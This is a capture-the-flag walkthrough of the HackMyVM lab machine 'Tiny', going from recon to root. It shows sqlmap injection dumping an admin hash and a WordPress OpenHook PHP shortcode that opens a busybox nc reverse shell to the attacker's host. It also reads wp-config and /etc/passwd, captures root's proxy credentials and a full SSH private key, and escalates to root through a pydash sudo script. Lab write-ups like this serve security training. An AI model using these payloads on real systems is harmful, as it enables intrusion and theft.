# Tiny

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.139:22
Open 10.0.2.139:80
Open 10.0.2.139:8888
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.139
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOHL4gbzUOgWlMW/HgWpBe3FlvvdyW1IsS+o1NK/YbUOoM3iokvdbkFxXdYjyvzkNpvpCXfldEQwS+BIfEmdtwU=
|   256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0o8/EYPi0jQMqY1zqXqlKfugpCtjg0i5m3bzbyfqxt
80/tcp   open  http       syn-ack Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 6.3.1
| http-robots.txt: 15 disallowed entries 
| /wp-admin/ /cgi-bin/ /private/ /temp/ /backup/ /old/ 
| /test/ /dev/ / /misc/ /downloads/ /doc/ /documents/ 
|_/restricted/ /confidential/
|_http-title: Blog
8888/tcp open  http-proxy syn-ack tinyproxy 1.11.1
|_http-server-header: tinyproxy/1.11.1
|_http-title: 403 Access denied
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/tiny/writeup.png)

`/robots.txt` has a DNS record, update.

![writeup-1.png](/assets/pentest/hackmyvm/tiny/writeup-1.png)

```bash
└─$ nuclei -u http://tiny.hmv -tags wordpress
[wordpress-akismet:outdated_version] [http] [info] http://tiny.hmv/wp-content/plugins/akismet/readme.txt ["5.2"] [last_version="5.5"]
[wordpress-directory-listing] [http] [info] http://tiny.hmv/wp-content/uploads/
[wordpress-readme-file] [http] [info] http://tiny.hmv/readme.html
[wordpress-directory-listing] [http] [info] http://tiny.hmv/wp-includes/
[wordpress-detect:version_by_css] [http] [info] http://tiny.hmv/wp-admin/install.php ["6.9"]
[wp-license-file] [http] [info] http://tiny.hmv/license.txt
[wordpress-login] [http] [info] http://tiny.hmv/wp-login.php
[wordpress-xmlrpc-detect] [http] [info] http://tiny.hmv/xmlrpc.php
[wordpress-theme-detect:twentytwentyone] [http] [info] http://tiny.hmv
```

### SQLi

There's also subdomain in the `/robots.txt`

![writeup-2.png](/assets/pentest/hackmyvm/tiny/writeup-2.png)

If you type `'` server returns 500, SQLi?

```bash
└─$ sqlmap -u 'http://wish.tiny.hmv/index.php' --form --batch --dbms=MySQL --level 5 --risk 3 --technique=BEU --current-db
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=fTfN' RLIKE (SELECT (CASE WHEN (5940=5940) THEN 0x6654664e ELSE 0x28 END)) AND 'DCwv'='DCwv&wish=dlbN
---
[17:11:16] [INFO] retrieved: wish_db
current database: 'wish_db'
```

```bash
└─$ sqlmap -u 'http://wish.tiny.hmv/index.php' --form --batch --dbms=MySQL --level 5 --risk 3 --technique=BEU -D wish_db --tables
Database: wish_db
[3 tables]
+--------------+
| admin        |
| utilisateurs |
| wishs        |
+--------------+
```

```bash
└─$ sqlmap -u 'http://wish.tiny.hmv/index.php' --form --batch --dbms=MySQL --level 5 --risk 3 --technique=BEU -D wish_db -T admin --dump
Database: wish_db
Table: admin
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 8df4387dd1598d4dcf237f9443028cec | umeko    |
+----+----------------------------------+----------+
```

![writeup-3.png](/assets/pentest/hackmyvm/tiny/writeup-3.png)

> Creds: `umeko:fuckit!`

### RCE

With above credentials we can access wordpress

![writeup-4.png](/assets/pentest/hackmyvm/tiny/writeup-4.png)

```bash
└─$ docker run -it --rm --add-host tiny.hmv:10.0.2.139 wpscanteam/wpscan --url http://tiny.hmv/ -e vp --cookie-string 'wordpress_da923ae4633b55d4b75017142eee0ec9=umeko%7C1766787293%7C3xxV62pstYRuHFGYgEhoFMY8AxyIgj7WNHNzERRFRCg%7C44dd3df8e0acfe6c9ac51b703de6a78d26dd6e6147f67452cda2e322bb724344; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_da923ae4633b55d4b75017142eee0ec9=umeko%7C1766787293%7C3xxV62pstYRuHFGYgEhoFMY8AxyIgj7WNHNzERRFRCg%7C7e7b65cf19fcf6cb6ef91d78556157f9da25075ee10c5b1d20d7fb6eb8cef97f; gg_trusted[0]=5bbaba58213bca4c96b1efc6dd8df2ea; wp-settings-2=mfold%3Do; wp-settings-time-2=1765577694'
...
[+] WordPress theme in use: twentytwentyone
 | Location: http://tiny.hmv/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://tiny.hmv/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://tiny.hmv/wp-content/themes/twentytwentyone/style.css?ver=1.9
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://tiny.hmv/wp-content/themes/twentytwentyone/style.css?ver=1.9, Match: 'Version: 1.9'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.
...
```

Access to **Appearance** is disabled so we can't edit pages for RCE.
- [http://tiny.hmv/wp-admin/options-general.php?page=openhook&tab=wordpress](http://tiny.hmv/wp-admin/options-general.php?page=openhook&tab=wordpress)

**The OpenHook plugin** for WordPress is vulnerable to Remote Code Execution in versions up to, and including, 4.3.0 via the 'php' shortcode. This allows authenticated attackers with subscriber-level permissions or above, to execute code on the server. This requires the `[php]` shortcode setting to be enabled on the vulnerable site.
- [https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/thesis-openhook/openhook-430-authenticated-subscriber-remote-code-execution-via-shortcode](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/thesis-openhook/openhook-430-authenticated-subscriber-remote-code-execution-via-shortcode)

Doesn't seem to work?

![writeup-5.png](/assets/pentest/hackmyvm/tiny/writeup-5.png)

But if user is changed to `admin` then RCE triggers

![writeup-6.png](/assets/pentest/hackmyvm/tiny/writeup-6.png)

Set code to reverse shell. I wanted to use `$_REQUEST`, but it would not accept any variables.
```php
[php]<?php system("busybox nc 10.0.2.15 4444 -e /bin/bash"); ?>[/php]
```

```bash
└─$ penelope -p 4444
www-data@tiny:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@tiny:/var/www/html$ cat wp-config.php  | grep DB_
define( 'DB_NAME', 'wordpressdb' );
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', '6rt443RKhwTXjWDe' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
define( 'DB_COLLATE', '' );

www-data@tiny:/var/www/html$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
vic:x:1000:1000:,,,:/home/vic:/bin/zsh
```

### TinyProxy

```bash
www-data@tiny:/etc/tinyproxy$ cat tinyproxy.conf  | grep -vE '#|^$'
User tinyproxy
Group tinyproxy
Port 8888
Timeout 600
DefaultErrorFile "/usr/share/tinyproxy/default.html"
StatFile "/usr/share/tinyproxy/stats.html"
LogFile "/var/log/tinyproxy/tinyproxy.log"
LogLevel Info
PidFile "/run/tinyproxy/tinyproxy.pid"
Upstream http localhost:1111
MaxClients 100
Allow 127.0.0.1
Allow ::1
Allow 192.168.0.30
ViaProxyName "tinyproxy"
www-data@tiny:/etc/tinyproxy$ nc 0 1111
(UNKNOWN) [0.0.0.0] 1111 (?) : Connection refused
www-data@tiny:/etc/tinyproxy$ ss -tulnp4
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0          0                    0.0.0.0:68                 0.0.0.0:*
udp      UNCONN    0          0                    0.0.0.0:59300              0.0.0.0:*
tcp      LISTEN    0          1024                 0.0.0.0:8888               0.0.0.0:*
tcp      LISTEN    0          511                127.0.0.1:8000               0.0.0.0:*
tcp      LISTEN    0          80                 127.0.0.1:3306               0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*
```

Port 1111 is used by TinyProxy, but it's not active. If we start listening on portwe get a callback.
```bash
www-data@tiny:/etc/tinyproxy$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 51658
GET http://127.0.0.1:8000/id_rsa HTTP/1.1
Host: 127.0.0.1:8000
Connection: close
Via: 1.1 tinyproxy (tinyproxy/1.11.1)
Authorization: Basic cm9vdDpRMlg0OXQ0V2pz
User-Agent: curl/7.88.1
Accept: */*

www-data@tiny:/etc/tinyproxy$ echo cm9vdDpRMlg0OXQ0V2pz |base64 -d ;echo
root:Q2X49t4Wjs
```

TinyProxy is configured as following
```bash
curl
  → tinyproxy (8888)
      → upstream HTTP proxy (127.0.0.1:1111)
          → final target (127.0.0.1:8000)
```

Without an upstream proxy, the connection fails.  
Using `socat`, forward everything received on port 1111 directly to port 8000.
```bash
www-data@tiny:/etc/tinyproxy$ socat -v TCP-LISTEN:1111,reuseaddr,fork TCP:127.0.0.1:8000
> 2025/12/13 10:17:01.000870590  length=206 from=0 to=205
GET http://127.0.0.1:8000/id_rsa HTTP/1.1\r
Host: 127.0.0.1:8000\r
Connection: close\r
Via: 1.1 tinyproxy (tinyproxy/1.11.1)\r
Authorization: Basic cm9vdDpRMlg0OXQ0V2pz\r
User-Agent: curl/7.88.1\r
Accept: */*\r
\r
< 2025/12/13 10:17:01.000883182  length=2851 from=0 to=2850
HTTP/1.1 200 OK\r
Server: nginx/1.22.1\r
Date: Sat, 13 Dec 2025 09:17:01 GMT\r
Content-Type: application/octet-stream\r
Content-Length: 2602\r
Last-Modified: Sat, 30 Sep 2023 06:17:50 GMT\r
Connection: close\r
ETag: "6517bd8e-a2a"\r
Accept-Ranges: bytes\r
\r
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

> **Note**: `-v` is required, without it you will not see output.

## SSH

```bash
└─$ nano id_rsa.vic
└─$ chmod 600 id_rsa.vic
└─$ ssh -i id_rsa.vic vic@10.0.2.139
╭─vic@tiny ~
╰─$ id
uid=1000(vic) gid=1000(vic) groups=1000(vic),100(users)
```

### User.txt

```bash
╭─vic@tiny ~
╰─$ cat user.txt
7d9b0f6638734dbb10545f446c04a42b
```

## Privilege Escalation

```bash
╭─vic@tiny ~
╰─$ sudo -l
Matching Defaults entries for vic on tiny:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vic may run the following commands on tiny:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/car.py*
```

```python
╰─$ cat /opt/car.py
import sys
import random
import pydash

class Car:
    def __init__(self, model, year):
        self.model = model
        self.year = year
        self.id = random.randint(1, 99999)

    def get_info(self, info_type):
        if info_type == "model":
            return self.model
        elif info_type == "year":
            return self.year
        elif info_type == "id":
            return self.id

def poc(path, arg):
    obj = Car('Sedan', 2011)
    res = pydash.objects.invoke(obj, path, arg)
    print(res)

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('Missing args: %s <path> <arg>' % sys.argv[0])
        sys.exit(1)
    poc(sys.argv[1], sys.argv[2])
    
╰─$ pip list | grep pydash
pydash                        5.1.2
```

`pydash.objects.invoke(obj, path, arg)` line is very sussy
- [https://nvd.nist.gov/vuln/detail/CVE-2023-26145](https://nvd.nist.gov/vuln/detail/CVE-2023-26145)
- [https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518](https://security.snyk.io/vuln/SNYK-PYTHON-PYDASH-5916518)

POC paths discovery
```bash
╰─$ python3
>>> import pydash
>>> import random
>>> class Animal:
...     def __init__(self, typ, age):
...         self.type = typ
...         self.age = age
...         self.id = random.randint(1, 99999)
...
>>> g = Animal('goat', 5)
>>> print(g.__init__.__globals__.keys())
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__annotations__', '__builtins__', 'pydash', 'Animal', 'g', 'random'])
>>> print(g.__init__.__globals__["random"].__dict__.keys())
dict_keys(['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', '_warn', '_log', '_exp', '_pi', '_e', '_ceil', '_sqrt', '_acos', '_cos', '_sin', 'TWOPI', '_floor', '_isfinite', '_urandom', '_Set', '_Sequence', '_index', '_accumulate', '_repeat', '_bisect', '_os', '_random', '_sha512', '__all__', 'NV_MAGICCONST', 'LOG4', 'SG_MAGICCONST', 'BPF', 'RECIP_BPF', '_ONE', 'Random', 'SystemRandom', '_inst', 'seed', 'random', 'uniform', 'triangular', 'randint', 'choice', 'randrange', 'sample', 'shuffle', 'choices', 'normalvariate', 'lognormvariate', 'expovariate', 'vonmisesvariate', 'gammavariate', 'gauss', 'betavariate', 'paretovariate', 'weibullvariate', 'getstate', 'setstate', 'getrandbits', 'randbytes', '_test_generator', '_test'])
```

It seems like POC is possible because of `random` module having access to `_os` module

```bash
╰─$ sudo python3 /opt/car.py '__init__.__globals__.random._os.system' 'zsh -p'
tiny# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
tiny# cat /root/root.txt
0785ded6dbb7e73959924ad06152eabc
```